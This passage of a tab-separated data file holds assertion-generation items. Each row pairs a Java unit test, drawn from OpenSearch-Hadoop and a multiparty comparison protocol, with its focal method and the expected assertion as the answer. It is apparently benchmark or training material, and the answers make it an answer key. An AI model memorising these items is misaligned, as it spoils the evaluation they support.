run(long taskId, List<Integer> parties, Object input, OperatorType op) throws ProtocolException { if (me == 0) { List<Integer> abyIds = ImmutableList.of(0, 1); int curMax = (int)input; for (int id = 1; id < num; id++) { int curPort = this.port; ProtocolExecutor aby = factory.create( OwnerInfo.newBuilder().setEndpoint(address + "":"" + curPort).setId(me).build(), ProtocolType.ABY); List<byte[]> abyInputs = ImmutableList.of(OpenHuFuCodec.encodeInt(curMax), OpenHuFuCodec.encodeInt(0)); List<byte[]> abyOutputs = (List<byte[]>) aby.run(taskId, abyIds, abyInputs, op, ColumnType.INT, address, curPort, id != num - 1, (int)taskId * 100 + id); curMax = OpenHuFuCodec.decodeInt(abyOutputs.get(0)); LOG.info(""round {}: {}"", id, Integer.toHexString(curMax)); } return curMax; } List<Integer> abyIds = ImmutableList.of(1, 0); if (me == 1 && num == 2) { ProtocolExecutor aby = factory.create( OwnerInfo.newBuilder().setEndpoint(address + "":"" + port).setId(me).build(), ProtocolType.ABY); List<byte[]> abyInputs = ImmutableList.of(OpenHuFuCodec.encodeInt(0), OpenHuFuCodec.encodeInt((int)input)); List<byte[]> abyOutputs = (List<byte[]>) aby.run(taskId, abyIds, abyInputs, op, ColumnType.INT, address, port, false, (int)taskId * 100 + me); int ret = OpenHuFuCodec.decodeInt(abyOutputs.get(0)); return ret; }  int val1 = 0, val2 = (int)input; if (me != 1) { List<byte[]> recv = rpcRecv(taskId, me - 1, me - 1); val1 = OpenHuFuCodec.decodeInt(recv.get(0)); LOG.info(""{} recv {}"", me, Integer.toHexString(val1)); } ProtocolExecutor aby = factory.create( OwnerInfo.newBuilder().setEndpoint(address + "":"" + port).setId(me).build(), ProtocolType.ABY); List<byte[]> abyInputs = ImmutableList.of(OpenHuFuCodec.encodeInt(val1), OpenHuFuCodec.encodeInt(val2)); List<byte[]> abyOutputs = (List<byte[]>) aby.run(taskId, abyIds, abyInputs, op, ColumnType.INT, address, port, me != num - 1, (int)taskId * 100 + me); val1 = OpenHuFuCodec.decodeInt(abyOutputs.get(0)); if (me != num - 1) { byte[] send = OpenHuFuCodec.encodeInt(val1); rpcSend(taskId, me, me + 1, ImmutableList.of(send)); LOG.info(""{} send {}"", me, Integer.toHexString(val1)); } return 0; }"	assertEquals(res, 229)
"Exception { ExecutorService service = Executors.newFixedThreadPool(partyNum);  int[] inputs = new int[partyNum];  for (int taskId = 0; taskId < 50; taskId++) { int ans = 0; for (int i = 0; i < partyNum; i++) { inputs[i] = (i * 10 + taskId) % (partyNum + 7); if (inputs[i] > ans) { ans = inputs[i]; } } ArrayList<Future<Integer>> results = new ArrayList<>(); for (int p = 0; p < partyNum; p++) { MultiCmp cmp = cmps.get(p); int input = inputs[p]; long tid = taskId; Future<Integer> res = service.submit(new Callable<Integer>() { @Override public Integer call() throws Exception { LOG.info(""cmp input = {}"", input); int ret = (int)cmp.run(tid, ids, input, OperatorType.MAX); return ret; } }); results.add(res); } for (int p = 0; p < partyNum; p++) { int res = (int)(results.get(p).get()); if (p == 0) { LOG.info(""taskId = {}"", taskId); ""<AssertPlaceHolder>""; } } }  }
run(long taskId, List<Integer> parties, Object input, OperatorType op) throws ProtocolException { if (me == 0) { List<Integer> abyIds = ImmutableList.of(0, 1); int curMax = (int)input; for (int id = 1; id < num; id++) { int curPort = this.port; ProtocolExecutor aby = factory.create( OwnerInfo.newBuilder().setEndpoint(address + "":"" + curPort).setId(me).build(), ProtocolType.ABY); List<byte[]> abyInputs = ImmutableList.of(OpenHuFuCodec.encodeInt(curMax), OpenHuFuCodec.encodeInt(0)); List<byte[]> abyOutputs = (List<byte[]>) aby.run(taskId, abyIds, abyInputs, op, ColumnType.INT, address, curPort, id != num - 1, (int)taskId * 100 + id); curMax = OpenHuFuCodec.decodeInt(abyOutputs.get(0)); LOG.info(""round {}: {}"", id, Integer.toHexString(curMax)); } return curMax; } List<Integer> abyIds = ImmutableList.of(1, 0); if (me == 1 && num == 2) { ProtocolExecutor aby = factory.create( OwnerInfo.newBuilder().setEndpoint(address + "":"" + port).setId(me).build(), ProtocolType.ABY); List<byte[]> abyInputs = ImmutableList.of(OpenHuFuCodec.encodeInt(0), OpenHuFuCodec.encodeInt((int)input)); List<byte[]> abyOutputs = (List<byte[]>) aby.run(taskId, abyIds, abyInputs, op, ColumnType.INT, address, port, false, (int)taskId * 100 + me); int ret = OpenHuFuCodec.decodeInt(abyOutputs.get(0)); return ret; }  int val1 = 0, val2 = (int)input; if (me != 1) { List<byte[]> recv = rpcRecv(taskId, me - 1, me - 1); val1 = OpenHuFuCodec.decodeInt(recv.get(0)); LOG.info(""{} recv {}"", me, Integer.toHexString(val1)); } ProtocolExecutor aby = factory.create( OwnerInfo.newBuilder().setEndpoint(address + "":"" + port).setId(me).build(), ProtocolType.ABY); List<byte[]> abyInputs = ImmutableList.of(OpenHuFuCodec.encodeInt(val1), OpenHuFuCodec.encodeInt(val2)); List<byte[]> abyOutputs = (List<byte[]>) aby.run(taskId, abyIds, abyInputs, op, ColumnType.INT, address, port, me != num - 1, (int)taskId * 100 + me); val1 = OpenHuFuCodec.decodeInt(abyOutputs.get(0)); if (me != num - 1) { byte[] send = OpenHuFuCodec.encodeInt(val1); rpcSend(taskId, me, me + 1, ImmutableList.of(send)); LOG.info(""{} send {}"", me, Integer.toHexString(val1)); } return 0; }"	assertEquals(res, ans)
"testThetaOuterJoinDataSet() { DataSet s0 = generateLeft(); DataSet s1 = generateRight(); Expression leftRef = ExpressionFactory.createInputRef(1, ColumnType.DOUBLE, Modifier.PUBLIC); Expression rightRef = ExpressionFactory.createInputRef(4, ColumnType.DOUBLE, Modifier.PUBLIC); Expression cmp = ExpressionFactory.createBinaryOperator(OperatorType.LT, ColumnType.BOOLEAN, leftRef, rightRef); JoinCondition condition = JoinCondition.newBuilder().setType(JoinType.OUTER) .setModifier(Modifier.PUBLIC).setCondition(cmp).build(); DataSet res = Interpreter.join(s0, s1, condition); DataSetIterator it = res.getIterator(); int count = 0; while (it.next()) { count++; } ""<AssertPlaceHolder>""; }
join(DataSet left, DataSet right, JoinCondition condition) { return JoinDataSet.create(left, right, new InterpretiveMatcher(condition, left.getSchema(), right.getSchema()), condition.getType()); }"	assertEquals(5, count)
"Exception { ArrayWritable array = new WritableArrayWritable(Text.class); FastByteArrayOutputStream out = new FastByteArrayOutputStream(); DataOutputStream da = new DataOutputStream(out); array.write(da); da.close();  WritableArrayWritable waw = new WritableArrayWritable(NullWritable.class); waw.readFields(new DataInputStream(new FastByteArrayInputStream(out.bytes()))); ""<AssertPlaceHolder>""; }
readFields(DataInput in) throws IOException { super.readFields(in);  // First clear the map.  Otherwise we will just accumulate // entries every time this method is called. this.instance.clear();  // Read the number of entries in the map  int entries = in.readInt();  // Then read each key/value pair  for (int i = 0; i < entries; i++) { Writable key = (Writable) ReflectionUtils.newInstance(getClass(in.readByte()), getConf());  key.readFields(in);  Writable value = (Writable) ReflectionUtils.newInstance(getClass(in.readByte()), getConf());  value.readFields(in); instance.put(key, value); } }"	assertSame(array.getValueClass(), waw.getValueClass())
"IOException { User jdkUser = new HadoopUser(UserGroupInformation.getCurrentUser(), new TestSettings()); // This should always be null - We aren't running with Kerberos enabled in this test. // See HadoopUserKerberosTest for that. ""<AssertPlaceHolder>""; }
getKerberosPrincipal() { if (ugi.hasKerberosCredentials()) { return new KerberosPrincipal(ugi.getUserName()); } return null; }"	assertThat(jdkUser.getKerberosPrincipal(), is(nullValue()))
"Exception { String error = ""MapperParsingException[failed to parse]; nested: ElasticSearchParseException[Failed to derive xcontent from (offset=0, length=14): "" + ""[83, 116, 114, 101, 97, 109, 32, 99, 108, 111, 115, 101, 100, 46]]""; ""<AssertPlaceHolder>""; }
extractInvalidXContent(String errorMessage) { if (!StringUtils.hasText(errorMessage)) { return null; }  String group = findMatch(XCONTENT_PAYLOAD.matcher(errorMessage)); if (!StringUtils.hasText(group)) { return null; }  String match = findMatch(OFFSET.matcher(errorMessage)); int offset = (StringUtils.hasText(match) ? Integer.valueOf(match) : 0); match = findMatch(LENGTH.matcher(errorMessage)); int length = (StringUtils.hasText(match) ? Integer.valueOf(match) : 0);   List<Byte> bytes = new ArrayList<Byte>(); // parse the collection into numbers and back to a String try { for (String byteValue : StringUtils.tokenize(group, "","")) { bytes.add(Byte.parseByte(byteValue)); } if (length == 0) { length = bytes.size(); }  byte[] primitives = new byte[length]; for (int index = 0; index < length; index++) { primitives[index] = bytes.get(index + offset).byteValue(); } return new String(primitives, StringUtils.UTF_8); } catch (Exception ex) { // can't convert back the byte array - give up return null; } }"	"assertThat(ErrorUtils.extractInvalidXContent(error), is(""Stream closed.""))"
"Exception { BytesArray be = new BytesArray(""{""index"":{""_index"":""mroldapi"",""_type"":""pattern-format-2179-10-06-with-id""""_id"":""185""}}"" + ""{""url"":""http://www.last.fm/music/Reamonn"",""@timestamp"":""2179-10-06T19:20:25.000Z"",""name"":""Reamonn"",""number"":""185"",""picture"":""http://userserve-ak.last.fm/serve/252/45094837.png""}"");  String error = ""JsonParseException[Unexpected character ('""' (code 34)): was expecting comma to separate OBJECT entries at [Source: [B@6e26dd20; line: 1, column: 75]]"";  ""<AssertPlaceHolder>""; }
extractJsonParse(String errorMessage, ByteSequence body) { if (!StringUtils.hasText(errorMessage)) { return null; } if (!errorMessage.startsWith(""JsonParseException"")) { return null; }  String match = findMatch(LINE.matcher(errorMessage)); int line = (StringUtils.hasText(match) ? Integer.valueOf(match) : 0); match = findMatch(COLUMN.matcher(errorMessage)); int column = (StringUtils.hasText(match) ? Integer.valueOf(match) : 0);  String payload = body.toString(); int position = 0; int linesRead = 1; for (int index = 0; index < payload.length() && linesRead < line; index++) { if (payload.charAt(index) == '\n') { linesRead++; } position++; } position += column;  // found line, return column +/- some chars int from = Math.max(position - CHARS_TO_THE_LEFT, 0); int to = Math.min(position + CHARS_TO_THE_RIGHT, payload.length()); return payload.substring(from, to); }"	"assertEquals(""0-06-with-id""""_id"":"""", ErrorUtils.extractJsonParse(error, be))"
"Exception { TransportFactory mockFactory = mock(TransportFactory.class); Transport mockTransport = mock(Transport.class); when(mockFactory.create(any(), any(), any())).thenReturn(mockTransport);  when(mockTransport.execute(any())).thenThrow(new RuntimeException(""whoops"")); NetworkClient networkClient = new NetworkClient(new TestSettings(), mockFactory); SimpleRequest simpleRequest = new SimpleRequest(Request.Method.GET, """", """"); try { networkClient.execute(simpleRequest); fail(""exception should have been thrown""); } catch (Exception e) { // OpenSearchHadoopNoNodesLeftException indicates we tried to retry (even if there is just a single node) ""<AssertPlaceHolder>""; } }
execute(Request request) { return execute(request, true); }"	assertEquals(OpenSearchHadoopNoNodesLeftException.class, e.getClass())
"Exception { Resource res = createResource(""foo""); ""<AssertPlaceHolder>""; }
toString() { if (typed) { return index + ""/"" + type; } else { return index; } }"	"assertEquals(""foo"", res.toString())"
"Exception { Resource res = createResource(""_all""); ""<AssertPlaceHolder>""; }
toString() { if (typed) { return index + ""/"" + type; } else { return index; } }"	"assertEquals(""_all"", res.toString())"
"Exception { Resource res = createResource(""fo_o""); ""<AssertPlaceHolder>""; }
toString() { if (typed) { return index + ""/"" + type; } else { return index; } }"	"assertEquals(""fo_o"", res.toString())"
"Exception { Settings s = new TestSettings(); s.setProperty(ConfigurationOptions.OPENSEARCH_QUERY, ""{""match_all"":{}}""); Resource res = createResource(""foo/_search=?somequery"", s); ""<AssertPlaceHolder>""; }
toString() { if (typed) { return index + ""/"" + type; } else { return index; } }"	"assertEquals(""foo"", res.toString())"
"Exception { Settings s = new TestSettings(); s.setProperty(ConfigurationOptions.OPENSEARCH_QUERY, ""{""match_all"":{}}""); Resource res = createResource(""foo/_search=?somequery&bla=bla"", s); ""<AssertPlaceHolder>""; }
toString() { if (typed) { return index + ""/"" + type; } else { return index; } }"	"assertEquals(""foo"", res.toString())"
"Exception { String index = ""index""; Settings settings = new TestSettings(); settings.setInternalVersion(OpenSearchMajorVersion.V_2_X); settings.setResourceWrite(index); Resource writeResource = new Resource(settings, false); BytesArray document = new BytesArray(""{""field"":""value""}""); SimpleRequest request = new SimpleRequest(Request.Method.POST, null, index + ""/_doc"", null, document); String response = ""{\n"" + ""  ""_index"": ""index"",\n"" + ""  ""_type"": ""_doc"",\n"" + ""  ""_id"": ""AbcDefGhiJklMnoPqrS_"",\n"" + ""  ""_version"": 1,\n"" + ""  ""result"": ""created"",\n"" + ""  ""_shards"": {\n"" + ""    ""total"": 2,\n"" + ""    ""successful"": 1,\n"" + ""    ""failed"": 0\n"" + ""  },\n"" + ""  ""_seq_no"": 0,\n"" + ""  ""_primary_term"": 1\n"" + ""}"";  NetworkClient mock = Mockito.mock(NetworkClient.class); Mockito.when(mock.execute(Mockito.eq(request), Mockito.eq(true))) .thenReturn(new SimpleResponse(201, new FastByteArrayInputStream(new BytesArray(response)), ""localhost:9200""));  RestClient client = new RestClient(new TestSettings(), mock);  String id = client.postDocument(writeResource, document);  ""<AssertPlaceHolder>""; }
postDocument(Resource resource, BytesArray document) throws IOException { // If untyped, the type() method returns '_doc' Request request = new SimpleRequest(Method.POST, null, resource.index() + ""/"" + resource.type(), null, document); Response response = execute(request, true); Object id = parseContent(response.body(), ""_id""); if (id == null || !StringUtils.hasText(id.toString())) { throw new OpenSearchHadoopInvalidRequest( String.format(""Could not determine successful write operation. Request[%s > %s] Response[%s]"", request.method(), request.path(), IOUtils.asString(response.body()))); } return id.toString(); }"	"assertEquals(""AbcDefGhiJklMnoPqrS_"", id)"
"Exception { String index = ""index""; Settings settings = new TestSettings(); settings.setInternalVersion(OpenSearchMajorVersion.V_2_X); settings.setResourceWrite(index); Resource writeResource = new Resource(settings, false); BytesArray document = new BytesArray(""{""field"":""value""}""); SimpleRequest request = new SimpleRequest(Request.Method.POST, null, index + ""/_doc"", null, document); String response = ""{\n"" + ""  ""_index"": ""index"",\n"" + ""  ""_type"": ""_doc"",\n"" + ""  ""definitely_not_an_id"": ""AbcDefGhiJklMnoPqrS_"",\n"" + // Make the ID go away ""  ""_version"": 1,\n"" + ""  ""result"": ""created"",\n"" + ""  ""_shards"": {\n"" + ""    ""total"": 2,\n"" + ""    ""successful"": 1,\n"" + ""    ""failed"": 0\n"" + ""  },\n"" + ""  ""_seq_no"": 0,\n"" + ""  ""_primary_term"": 1\n"" + ""}"";  NetworkClient mock = Mockito.mock(NetworkClient.class); Mockito.when(mock.execute(Mockito.eq(request), Mockito.eq(true))) .thenReturn(new SimpleResponse(201, new FastByteArrayInputStream(new BytesArray(response)), ""localhost:9200""));  RestClient client = new RestClient(new TestSettings(), mock);  String id = client.postDocument(writeResource, document);  ""<AssertPlaceHolder>""; }
postDocument(Resource resource, BytesArray document) throws IOException { // If untyped, the type() method returns '_doc' Request request = new SimpleRequest(Method.POST, null, resource.index() + ""/"" + resource.type(), null, document); Response response = execute(request, true); Object id = parseContent(response.body(), ""_id""); if (id == null || !StringUtils.hasText(id.toString())) { throw new OpenSearchHadoopInvalidRequest( String.format(""Could not determine successful write operation. Request[%s > %s] Response[%s]"", request.method(), request.path(), IOUtils.asString(response.body()))); } return id.toString(); }"	"assertEquals(""AbcDefGhiJklMnoPqrS_"", id)"
"Exception { String index = ""index"";  BytesArray query = new BytesArray(""{""query"":{""match_all"":{}}}""); SimpleRequest request = new SimpleRequest(Request.Method.GET, null, index + ""/_search?size=0&track_total_hits=true"", null, query); String response = ""{\n"" + ""    ""took"": 6,\n"" + ""    ""timed_out"": false,\n"" + ""    ""_shards"": {\n"" + ""        ""total"": 1,\n"" + ""        ""successful"": 1,\n"" + ""        ""skipped"": 0,\n"" + ""        ""failed"": 0\n"" + ""    },\n"" + ""    ""hits"": {\n"" + ""        ""total"": {\n"" + ""            ""value"": 5,\n"" + ""            ""relation"": ""gte""\n"" + ""        },\n"" + ""        ""max_score"": null,\n"" + ""        ""hits"": []\n"" + ""    }\n"" + ""}"";  NetworkClient mock = Mockito.mock(NetworkClient.class); Mockito.when(mock.execute(Mockito.eq(request), Mockito.eq(true))) .thenReturn(new SimpleResponse(201, new FastByteArrayInputStream(new BytesArray(response)), ""localhost:9200""));  RestClient client = new RestClient(new TestSettings(), mock);  long count = client.count(index, MatchAllQueryBuilder.MATCH_ALL);  ""<AssertPlaceHolder>""; }
count(String index, QueryBuilder query) { return count(index, null, null, query); }"	assertEquals(5L, count)
"Exception { List<PartitionDefinition> results = RestService.assignPartitions(pds, 6, 7); ""<AssertPlaceHolder>""; }
assignPartitions(List<PartitionDefinition> partitions, int currentTask, int totalTasks) { int opensearchPartitions = partitions.size(); if (totalTasks >= opensearchPartitions) { return (currentTask >= opensearchPartitions ? Collections.<PartitionDefinition>emptyList() : Collections.singletonList(partitions.get(currentTask))); } else { int partitionsPerTask = opensearchPartitions / totalTasks; int remainder = opensearchPartitions % totalTasks;  int partitionsPerCurrentTask = partitionsPerTask;  // spread the reminder against the tasks if (currentTask < remainder) { partitionsPerCurrentTask++; }  // find the offset inside the collection int offset = partitionsPerTask * currentTask; if (currentTask != 0) { offset += (remainder > currentTask ? 1 : remainder); }  // common case if (partitionsPerCurrentTask == 1) { return Collections.singletonList(partitions.get(offset)); }  List<PartitionDefinition> pa = new ArrayList<PartitionDefinition>(partitionsPerCurrentTask); for (int index = offset; index < offset + partitionsPerCurrentTask; index++) { pa.add(partitions.get(index)); } return pa; } }"	assertThat(results.size(), is(0))
"IOException { MappingSet mappings = getMappingSet(""numbers-as-strings""); // The schema doesn't matter since there's no data InputStream stream = getClass().getResourceAsStream(scrollData(""no-scroll-id"")); Settings testSettings = new TestSettings(); testSettings.setProperty(ConfigurationOptions.OPENSEARCH_READ_METADATA, """" + readMetadata); testSettings.setProperty(ConfigurationOptions.OPENSEARCH_READ_METADATA_FIELD, """" + metadataField); testSettings.setProperty(ConfigurationOptions.OPENSEARCH_OUTPUT_JSON, """" + readAsJson); testSettings.setProperty(DeserializationHandlerLoader.OPENSEARCH_READ_DATA_ERROR_HANDLERS, ""fix""); testSettings.setProperty(DeserializationHandlerLoader.OPENSEARCH_READ_DATA_ERROR_HANDLER + "".fix"" , CorrectingHandler.class.getName()); JdkValueReader valueReader = ObjectUtils.instantiate(JdkValueReader.class.getName(), testSettings); ScrollReader reader = new ScrollReader(ScrollReaderConfigBuilder.builder(valueReader, mappings.getResolvedView(), testSettings)); ScrollReader.Scroll scroll = reader.read(stream); ""<AssertPlaceHolder>""; }
read(InputStream content) throws IOException { Assert.notNull(content);  //copy content BytesArray copy = IOUtils.asBytes(content); content = new FastByteArrayInputStream(copy);  if (log.isTraceEnabled()) { log.trace(""About to parse scroll content "" + copy); }  Parser parser = new JacksonJsonParser(content);  try { return read(parser, copy); } finally { parser.close(); } }"	assertNull(scroll)
"testWriteBulkEntryWithIgnoreFailure() { BulkCommand command = Mockito.mock(BulkCommand.class); Mockito.when(command.write(1)).thenThrow(new OpenSearchHadoopIllegalStateException(""Things broke""));  Settings settings = new TestSettings(); settings.setProperty(SerializationHandlerLoader.OPENSEARCH_WRITE_DATA_ERROR_HANDLERS, ""skip""); settings.setProperty(SerializationHandlerLoader.OPENSEARCH_WRITE_DATA_ERROR_HANDLER +"".skip"", NothingToSeeHereHandler.class.getName());  BulkEntryWriter bulkEntryWriter = new BulkEntryWriter(settings, command);  BytesRef value = bulkEntryWriter.writeBulkEntry(1); Assert.""<AssertPlaceHolder>""; }
writeBulkEntry(Object object) { Object toRead = object; BytesRef writeResult = null; boolean retryWrite = false; boolean skip = false; int attempts = 0; do { try { retryWrite = false; writeResult = bulkCommand.write(toRead); } catch (Exception serializationException) { // Create error event List<String> passReasons = new ArrayList<String>(); SerializationFailure entry = new SerializationFailure(serializationException, object, passReasons);  // Set up error collector SerdeErrorCollector<Object> errorCollector = new SerdeErrorCollector<Object>();  // Attempt failure handling Exception abortException = serializationException; handlerloop: for (ISerializationErrorHandler serializationErrorHandler : serializationErrorHandlers) { HandlerResult result; try { result = serializationErrorHandler.onError(entry, errorCollector); } catch (OpenSearchHadoopAbortHandlerException ahe) { // Count this as an abort operation. Wrap cause in a serialization exception. result = HandlerResult.ABORT; abortException = new OpenSearchHadoopSerializationException(ahe.getMessage(), ahe.getCause()); } catch (Exception e) { LOG.error(""Could not handle serialization error event due to an exception in error handler. "" + ""Serialization exception:"", serializationException); throw new OpenSearchHadoopException(""Encountered unexpected exception during error handler execution."", e); }  switch (result) { case HANDLED: Assert.isTrue(errorCollector.getAndClearMessage() == null, ""Found pass message with Handled response. Be sure to return the value returned from "" + ""the pass(String) call.""); // Check for retries if (errorCollector.receivedRetries()) { Object retryObject = errorCollector.getAndClearRetryValue(); if (retryObject != null) { // Use new retry object to read toRead = retryObject; } // If null, retry same object.  // Limit the number of retries though to like 50 if (attempts >= 50) { throw new OpenSearchHadoopException(""Maximum retry attempts (50) reached for serialization errors.""); } else { retryWrite = true; attempts++; } } else { if (LOG.isDebugEnabled()) { LOG.debug(""Skipping a record that resulted in error while reading: ["" + object.toString() + ""]""); } else { LOG.info(""Skipping a record that resulted in error while reading. (DEBUG for more info).""); } skip = true; } break handlerloop; case PASS: String reason = errorCollector.getAndClearMessage(); if (reason != null) { passReasons.add(reason); } continue handlerloop; case ABORT: errorCollector.getAndClearMessage(); // Sanity clearing if (abortException instanceof OpenSearchHadoopSerializationException) { throw (OpenSearchHadoopSerializationException) abortException; } else { throw new OpenSearchHadoopSerializationException(abortException); } } } } } while (retryWrite);  if (writeResult == null && skip == false) { throw new OpenSearchHadoopSerializationException(""Could not write record to bulk request.""); }  return writeResult; }"	"assertNull(""Skipped values should be null"", value)"
"testWriteBulkEntryWithHandlersThatPassMessages() { BulkCommand command = Mockito.mock(BulkCommand.class); Mockito.when(command.write(1)).thenThrow(new OpenSearchHadoopIllegalStateException(""Things broke""));  Settings settings = new TestSettings(); settings.setProperty(SerializationHandlerLoader.OPENSEARCH_WRITE_DATA_ERROR_HANDLERS, ""marco,polo,skip""); settings.setProperty(SerializationHandlerLoader.OPENSEARCH_WRITE_DATA_ERROR_HANDLER +"".marco"", MarcoHandler.class.getName()); settings.setProperty(SerializationHandlerLoader.OPENSEARCH_WRITE_DATA_ERROR_HANDLER +"".polo"", PoloHandler.class.getName()); settings.setProperty(SerializationHandlerLoader.OPENSEARCH_WRITE_DATA_ERROR_HANDLER +"".skip"", NothingToSeeHereHandler.class.getName());  BulkEntryWriter bulkEntryWriter = new BulkEntryWriter(settings, command);  BytesRef value = bulkEntryWriter.writeBulkEntry(1); Assert.""<AssertPlaceHolder>""; }
writeBulkEntry(Object object) { Object toRead = object; BytesRef writeResult = null; boolean retryWrite = false; boolean skip = false; int attempts = 0; do { try { retryWrite = false; writeResult = bulkCommand.write(toRead); } catch (Exception serializationException) { // Create error event List<String> passReasons = new ArrayList<String>(); SerializationFailure entry = new SerializationFailure(serializationException, object, passReasons);  // Set up error collector SerdeErrorCollector<Object> errorCollector = new SerdeErrorCollector<Object>();  // Attempt failure handling Exception abortException = serializationException; handlerloop: for (ISerializationErrorHandler serializationErrorHandler : serializationErrorHandlers) { HandlerResult result; try { result = serializationErrorHandler.onError(entry, errorCollector); } catch (OpenSearchHadoopAbortHandlerException ahe) { // Count this as an abort operation. Wrap cause in a serialization exception. result = HandlerResult.ABORT; abortException = new OpenSearchHadoopSerializationException(ahe.getMessage(), ahe.getCause()); } catch (Exception e) { LOG.error(""Could not handle serialization error event due to an exception in error handler. "" + ""Serialization exception:"", serializationException); throw new OpenSearchHadoopException(""Encountered unexpected exception during error handler execution."", e); }  switch (result) { case HANDLED: Assert.isTrue(errorCollector.getAndClearMessage() == null, ""Found pass message with Handled response. Be sure to return the value returned from "" + ""the pass(String) call.""); // Check for retries if (errorCollector.receivedRetries()) { Object retryObject = errorCollector.getAndClearRetryValue(); if (retryObject != null) { // Use new retry object to read toRead = retryObject; } // If null, retry same object.  // Limit the number of retries though to like 50 if (attempts >= 50) { throw new OpenSearchHadoopException(""Maximum retry attempts (50) reached for serialization errors.""); } else { retryWrite = true; attempts++; } } else { if (LOG.isDebugEnabled()) { LOG.debug(""Skipping a record that resulted in error while reading: ["" + object.toString() + ""]""); } else { LOG.info(""Skipping a record that resulted in error while reading. (DEBUG for more info).""); } skip = true; } break handlerloop; case PASS: String reason = errorCollector.getAndClearMessage(); if (reason != null) { passReasons.add(reason); } continue handlerloop; case ABORT: errorCollector.getAndClearMessage(); // Sanity clearing if (abortException instanceof OpenSearchHadoopSerializationException) { throw (OpenSearchHadoopSerializationException) abortException; } else { throw new OpenSearchHadoopSerializationException(abortException); } } } } } while (retryWrite);  if (writeResult == null && skip == false) { throw new OpenSearchHadoopSerializationException(""Could not write record to bulk request.""); }  return writeResult; }"	"assertNull(""Skipped values should be null"", value)"
"Exception { MappingSet mappings = getMappingsForResource(""ip.json""); Mapping mapping = ensureAndGet(""index"", ""client"", mappings); ""<AssertPlaceHolder>""; }
getFields() { return fields; }"	assertEquals(1, mapping.getFields().length)
"Exception { MappingSet mappings = getMappingsForResource(""attachment.json""); Mapping mapping = ensureAndGet(""index"", ""person"", mappings); ""<AssertPlaceHolder>""; }
getFields() { return fields; }"	assertEquals(0, mapping.getFields().length)
"testCreateSimpleFilter() { ""<AssertPlaceHolder>""; }
toNumberedFilter(Collection<String> includeAsStrings){ if (includeAsStrings == null || includeAsStrings.isEmpty()) { return Collections.<NumberedInclude> emptyList(); }  List<NumberedInclude> numberedIncludes = new ArrayList<NumberedInclude>(includeAsStrings.size());  for (String include : includeAsStrings) { int index = include.indexOf("":""); String filter = include; int depth = 1;  try { if (index > 0) { filter = include.substring(0, index); String depthString = include.substring(index + 1); if (depthString.length() > 0) { depth = Integer.parseInt(depthString); } } } catch (NumberFormatException ex) { throw new OpenSearchHadoopIllegalArgumentException( String.format(Locale.ROOT, ""Invalid parameter [%s] specified in inclusion configuration"", include), ex ); } numberedIncludes.add(new NumberedInclude(filter, depth)); }  return numberedIncludes; }"	"assertThat( new ArrayList<FieldFilter.NumberedInclude>(FieldFilter.toNumberedFilter(Arrays.asList(""a""))), Matchers.contains(new FieldFilter.NumberedInclude(""a"", 1)) )"
"testCreateSimpleNumberedFilter() { ""<AssertPlaceHolder>""; }
toNumberedFilter(Collection<String> includeAsStrings){ if (includeAsStrings == null || includeAsStrings.isEmpty()) { return Collections.<NumberedInclude> emptyList(); }  List<NumberedInclude> numberedIncludes = new ArrayList<NumberedInclude>(includeAsStrings.size());  for (String include : includeAsStrings) { int index = include.indexOf("":""); String filter = include; int depth = 1;  try { if (index > 0) { filter = include.substring(0, index); String depthString = include.substring(index + 1); if (depthString.length() > 0) { depth = Integer.parseInt(depthString); } } } catch (NumberFormatException ex) { throw new OpenSearchHadoopIllegalArgumentException( String.format(Locale.ROOT, ""Invalid parameter [%s] specified in inclusion configuration"", include), ex ); } numberedIncludes.add(new NumberedInclude(filter, depth)); }  return numberedIncludes; }"	"assertThat( new ArrayList<FieldFilter.NumberedInclude>(FieldFilter.toNumberedFilter(Arrays.asList(""a:2""))), Matchers.contains(new FieldFilter.NumberedInclude(""a"", 2)) )"
"Exception { Assume.assumeTrue(whole.markSupported()); whole.mark(1024); int read = whole.read(); whole.reset(); int reread = whole.read(); ""<AssertPlaceHolder>""; }
read() { return (pos < count) ? (data.bytes[pos++] & 0xff) : -1; }"	assertEquals(read, reread)
"Exception { String jarWithinJarPath = ""file:/some/path/outer.jar!/BOOT-INF/lib/opensearch-hadoop-7.17.0.jar""; String file = jarWithinJarPath + ""!/org/opensearch/hadoop/util/Version.class""; URL url = new URL(""jar"", """", -1, file, new SpringBootURLStreamHandler(jarWithinJarPath) ); String canonicalFilePath = IOUtils.toCanonicalFilePath(url); ""<AssertPlaceHolder>""; }
toCanonicalFilePath(URL fileURL) throws URISyntaxException, IOException { if (fileURL == null) { return null; }  // Only handle jar: and file: schemes if (!""jar"".equals(fileURL.getProtocol()) && !""file"".equals(fileURL.getProtocol())) { return null; }  // Parse the jar file location from the jar url. Doesn't open any resources. if (""jar"".equals(fileURL.getProtocol())) { JarURLConnection jarURLConnection = (JarURLConnection) fileURL.openConnection(); fileURL = jarURLConnection.getJarFileURL(); } /* * Ordinarily at this point we would have a URL with a ""file"" protocal. But Spring boot puts the opensearch-hadoop jar is inside of the * spring boot jar like: * jar:file:/some/path/outer.jar!/BOOT-INF/lib/opensearch-hadoop-7.17.0.jar!/org/opensearch/hadoop/util/Version.class * And spring boot has its own custom URLStreamHandler which returns a URL with a ""jar"" protocol from the previous call to * getJarFileURL() (the default JDK URLStreamHandler does not do this). So this next check is Spring Boot specific. */ final String springBootInnerJarFilePath; if (""jar"".equals(fileURL.getProtocol())) { JarURLConnection jarURLConnection = (JarURLConnection) fileURL.openConnection(); springBootInnerJarFilePath = jarURLConnection.getEntryName(); fileURL = jarURLConnection.getJarFileURL(); } else { springBootInnerJarFilePath = null; }  String canonicalString; if (""file"".equals(fileURL.getProtocol())) { URI fileURI = fileURL.toURI(); File file = new File(fileURI);  // Use filesystem to resolve any sym links or dots in the path to // a singular unique file path File canonicalFile = file.getCanonicalFile(); canonicalString = canonicalFile.toURI().toString(); if (springBootInnerJarFilePath != null) { canonicalString = ""jar:"" + canonicalString + ""!/"" + springBootInnerJarFilePath; } } else { /* * In the event that some custom classloader is doing strange things and we don't have a file URL here, better to output * whatever URL it gives us rather than fail */ canonicalString = fileURL.toString(); } return canonicalString; }"	"assertEquals(""jar:"" + jarWithinJarPath, canonicalFilePath)"
"Exception { BytesRef ref = new BytesRef(); ref.add(new BytesArray(""one"")); ref.add(new BytesArray(""three"")); data.copyFrom(ref); ""<AssertPlaceHolder>""; }
length() { return size; }"	assertEquals(8, data.length())
